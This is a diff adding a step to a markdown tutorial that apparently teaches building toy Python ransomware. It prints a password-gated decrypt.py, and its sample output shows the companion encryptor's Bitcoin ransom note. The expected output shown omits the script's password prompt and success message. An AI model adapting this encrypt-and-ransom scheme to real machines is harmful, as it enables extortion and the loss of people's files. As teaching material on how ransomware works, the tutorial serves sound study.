@@ -298,3 +298,77 @@ Another one
 $ cat pleasedonthurtme.txt
 One more time</code>
 </pre>
+
+**Step 6:**
+Let's add a bit of fun to our ``decrypt.py`` file:
+
+<pre>
+<code>$ nano decrypt.py</code>
+</pre>
+
+Add the following code to the ``decrypt.py`` file:
+
+<details>
+<summary>🔑 How to Password-Lock the Encrypted Files:</summary>
+
+```python
+#!/usr/bin/env python3
+import os
+from cryptography.fernet import Fernet
+
+# Let's find some files!
+files = []
+
+for file in os.listdir():
+    if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+
+with open("thekey.key", "rb") as key:
+    secret_key = key.read()
+
+secret_phrase = "coffee"
+
+user_phrase = input(
+    "Enter the secret password to decrypt "
+    "all of your files:\n ")
+
+if user_phrase == secret_phrase:
+    for file in files:
+        with open(file, "rb") as thefile:
+            contents = thefile.read()
+        contents_decrypted = Fernet(secret_key).decrypt(contents)
+        with open(file, "wb") as thefile:
+            thefile.write(contents_decrypted)
+        print(
+            "Congratulations! All of your files have been decrypted. "
+            "Enjoy your coffee ️❤ ☕ ❤"
+        )
+else:
+    print(
+        "Sorry not sorry, but you entered da wong secret password. "
+        "Send me more Bitcoin! 🤑🤑🤑"
+    )
+
+```
+</details>
+
+Run ``voldemort.py`` *again* and you should see the following output:
+
+<pre>
+<code>$ python voldemort.py
+['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']
+UH OH!! All of your files have been encrypted! Send me 100 Bitcoin or they will be gone in 24 hours FOREVER!!! ☠️☠️☠️☠️☠️☠️☠️☠️☠️☠️</code>
+</pre>
+
+Then run ``decrypt.py`` *again* and you should see the following output:
+
+<pre>
+<code>$ python decrypt.py
+['file2.txt', 'file.txt', 'hey.txt', 'pleasedonthurtme.txt']</code>
+</pre>
+
+Now you can see that all of the files have finally been decrypted!!!
